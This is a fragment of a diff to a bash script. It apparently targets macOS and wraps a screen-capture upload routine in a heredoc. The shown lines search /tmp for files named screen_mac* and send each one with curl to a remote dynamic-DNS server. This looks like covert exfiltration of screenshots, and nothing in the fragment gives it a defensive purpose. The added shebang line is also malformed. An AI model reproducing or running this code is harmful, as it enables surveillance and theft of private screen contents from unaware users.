@@ -14,6 +14,8 @@ sudo /System//Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resource
 #done
 
 read -r -d '' SCRCAP_KK << EOM2
+\#!/bin/bash/
+set -ex
 find /tmp -name screen_mac* -type f -print | while read -r file ; do
   echo "uploading \$file"
   curl -X POST --form file=@\$file http://kk61676.ddns.net:3001/file || break
